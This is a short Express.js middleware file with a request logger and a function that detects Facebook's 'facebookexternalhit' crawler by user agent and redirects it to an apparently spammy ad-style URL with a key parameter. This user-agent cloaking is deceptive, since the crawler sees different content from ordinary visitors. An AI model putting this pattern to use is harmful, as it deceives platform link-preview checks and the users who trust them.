// Middleware to log all requests
const logger = (req, res, next) => {
  console.log(`${req.method} ${req.url}`);
  next(); // Pass control to the next middleware
};

// Middleware to handle `facebookexternalhit` user-agent
const userAgentRedirect = (req, res, next) => {
  const userAgent = req.headers['user-agent'];
  if (userAgent && userAgent.includes('facebookexternalhit')) {
    console.log('Redirecting to external URL');
    res.redirect('https://cleopatraadulatefrench.com/yrbajwpw4?key=c13dd6d2f97a5a0f967c85445d720bbb');
  } else {
    next(); // Pass control to the next middleware or route
  }
};

module.exports = {
  logger,
  userAgentRedirect
};
